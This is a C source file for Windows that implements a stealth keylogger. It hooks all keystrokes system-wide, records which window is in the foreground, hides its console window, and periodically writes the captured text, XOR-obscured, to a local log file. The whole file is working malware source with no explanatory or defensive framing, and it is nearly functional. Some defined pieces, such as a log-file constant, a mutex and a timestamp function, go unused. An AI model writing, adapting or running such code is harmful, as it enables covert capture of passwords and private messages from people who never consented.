#include <windows.h>
#include <stdio.h>
#include<string.h>
#include<time.h>

// Global variables
#define BUFFER_SIZE 1024
#define LOG_FILE "keylog.txt"

HANDLE fileMutex;

char sharedBuffer[BUFFER_SIZE];
int bufferIndex =0;
CRITICAL_SECTION bufferLock;

DWORD WINAPI KeyloggerThread(LPVOID lpParam);
DWORD WINAPI WindowLoggerThread(LPVOID lpParam);
DWORD WINAPI FileWriterThread(LPVOID lpParam);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void log_with_timestamp(const char *data);


void encrypt(char *data, int len) {
    for(int i=0;i<len;i++) {
        data[i] ^=0xAA;
    }
}


char *key_to_char(DWORD vkCode) {
    static char buffer[2];
    buffer[0] = (char)MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
    buffer[1] = '\0';
    return buffer;
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if(!hHook) {
        printf("Failed to set hook!\n");
        return 1;
    }

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}

// Hook procedure to capture keystrokes
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        EnterCriticalSection(&bufferLock);
        if (bufferIndex < BUFFER_SIZE - 2) {
            snprintf(sharedBuffer + bufferIndex, BUFFER_SIZE - bufferIndex, "%s", key_to_char(pKeyBoard->vkCode));
            bufferIndex += strlen(sharedBuffer + bufferIndex);
        }
        LeaveCriticalSection(&bufferLock);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Window logger thread function
DWORD WINAPI WindowLoggerThread(LPVOID lpParam) {
    char prevWindow[256] = "";
    char currentWindow[256];

    while (1) {
        HWND hwnd = GetForegroundWindow();
        if (hwnd) {
            GetWindowText(hwnd, currentWindow, sizeof(currentWindow));
            if (strcmp(currentWindow, prevWindow) != 0) {
                EnterCriticalSection(&bufferLock);
                snprintf(sharedBuffer + bufferIndex, BUFFER_SIZE - bufferIndex, "\n[WINDOW: %s]\n", currentWindow);
                bufferIndex += strlen(sharedBuffer + bufferIndex);
                LeaveCriticalSection(&bufferLock);
                strcpy(prevWindow, currentWindow);
            }
        }
        Sleep(1000); // Check every second
    }
    return 0;
}

// File writer thread function
DWORD WINAPI FileWriterThread(LPVOID lpParam) {
    while (1) {
        Sleep(5000); // Write to file every 5 seconds
        EnterCriticalSection(&bufferLock);

        if (bufferIndex > 0) {
            FILE *file = fopen("log.txt", "a");
            if (file) {
                encrypt(sharedBuffer, bufferIndex); // Encrypt before writing
                fwrite(sharedBuffer, 1, bufferIndex, file);
                fclose(file);
                bufferIndex = 0; // Reset the buffer
            }
        }

        LeaveCriticalSection(&bufferLock);
    }
    return 0;
}


// Log with timestamp
void log_with_timestamp(const char *data) {
    FILE *file = fopen("log.txt", "a");
    if (file) {
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        fprintf(file, "[%02d:%02d:%02d] %s\n", t->tm_hour, t->tm_min, t->tm_sec, data);
        fclose(file);
    }
}


// Main function
int main() {
    // Initialize critical section
    InitializeCriticalSection(&bufferLock);

    // Hide the console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Start threads
    HANDLE hThreads[3];
    hThreads[0] = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
    hThreads[1] = CreateThread(NULL, 0, WindowLoggerThread, NULL, 0, NULL);
    hThreads[2] = CreateThread(NULL, 0, FileWriterThread, NULL, 0, NULL);

    // Wait for threads to finish (optional)
    WaitForMultipleObjects(3, hThreads, TRUE, INFINITE);

    // Cleanup
    DeleteCriticalSection(&bufferLock);
    return 0;
}

